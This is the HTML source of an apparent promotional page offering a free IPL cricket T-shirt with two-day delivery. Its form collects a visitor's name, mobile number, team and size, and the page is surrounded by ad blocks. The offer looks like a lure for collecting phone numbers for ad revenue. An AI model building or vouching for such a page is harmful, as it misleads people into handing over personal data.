

<html lang="en">


<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
 <meta property="og:locale" content="en" />
<title>Enjoy this IPL more with free IPLVIVO Tshirt</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Order Now Free T-shirt With 2 Day Delivery" />
    <meta property="og:url" content="index.php" />
    <meta property="og:description" content="ORDER FOR FREE NOW" />
    <meta property="og:site_name" content="Enjoy this IPL more with free IPLVIVO Tshirt" />
    <meta property="og:image" content="http://iplfreetshirt.seo360.online/ogg.jpg"/>
    <link rel="shortcut icon" href="/sicon.png" type="image/x-icon">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="../www.w3schools.com/w3css/4/w3.css">
<link rel="stylesheet" type="text/css" href="style.css"/>
</head>
<body>
<div class="content">
 
    
<div class="container2">
<header>
    <div class="h_logo">
        <img src="http://iplfreetshirt.seo360.online/Logo.png" height="auto" />
    
    <h1><b>Enjoy This IPL More With Free IPL T-Shirt</b></h1>	</div>
</header>


<div class="container">
<center>
    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- seo3602 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:300px;height:60px"
     data-ad-client="ca-pub-6065543624364950"
     data-ad-slot="5406576171"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</center>
  <form action="./next.php" method="get">
<br>
    <b>Your Full Name</b>
    <input type="text" id="name" name="" placeholder="Enter Your Full Name..." Title="Enter Your Full Name" required>

    <b>Your Active Number</b>
    <input type="text" id="number" name="m" placeholder="Enter Your Active Mobile Number..." pattern="[7-9]{1}[0-9]{9}" maxlength="10" minlength="10" Title="Please enter valid phone number" required>
    <b>Select Your Team.</b>
     <select title="" tabindex="-1" required class="form-control" name="team">
							<option value="0">Choose team</option>
							<option value="Rajasthan Royals">Rajasthan Royals</option>
							<option value="Chennai Super Kings">Chennai Super Kings</option>
							<option value="Delhi Daredevils">Delhi Daredevils</option>
							<option value="Kings XI Punjab">Kings XI Punjab</option>
							<option value="Kolkata Knight Riders">Kolkata Knight Riders</option>
							<option value="Mumbai Indians">Mumbai Indians</option>
							<option value="Royal Challengers Bangalore">Royal Challengers Bangalore</option>
							<option value="SunRisers Hyderabad">SunRisers Hyderabad</option>
						  </select>
    <b>Select SIZE.</b>
 <select title="" tabindex="-1" required class="form-control" name="team">
							<option value="0">Choose Size</option>
							<option value="L">L</option>
							<option value="M">M</option>
							<option value="S">S</option>
							<option value="XL">XL</option>
							<option value="XXL">XXL</option>
							
						  </select>
						  

                <center><button class="button new btn-lg round" style="width:80%" align="center" type="submit"><i class="fa fa-hand-o-right" aria-hidden="true">&nbsp;</i><b>Next</b></button></center>
        
</form>
 <center>
     <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- seo3602 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:300px;height:250px"
     data-ad-client="ca-pub-6065543624364950"
     data-ad-slot="5406576171"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script><br>
 </center>
 <br>
<center>
<script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1484654,"000000","ffffff");</script>

</center>




</div>
</div>

</div>
</body>

</html>